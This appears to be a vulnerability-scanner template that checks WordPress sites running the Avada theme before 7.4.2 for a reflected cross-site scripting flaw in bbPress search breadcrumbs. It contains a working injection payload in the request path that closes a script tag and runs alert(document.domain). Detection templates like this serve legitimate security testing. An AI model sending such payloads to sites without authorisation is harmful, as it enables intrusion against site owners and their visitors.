id: avada-xss
name: WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting
severity: high
confidence: tentative
description: WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does
  not properly escape bbPress searches before outputting them back as breadcrumbs.
reference: CWE-79
tags:
- xss
- wp
- wordpress
- wp-theme
- avada
- wpscan
- vuln
requests:
- method: GET
  path: /forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
  matchers:
  - type: body
    words:
    - '"></script><script>alert(document.domain)</script>'
    - avada-footer-scripts
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
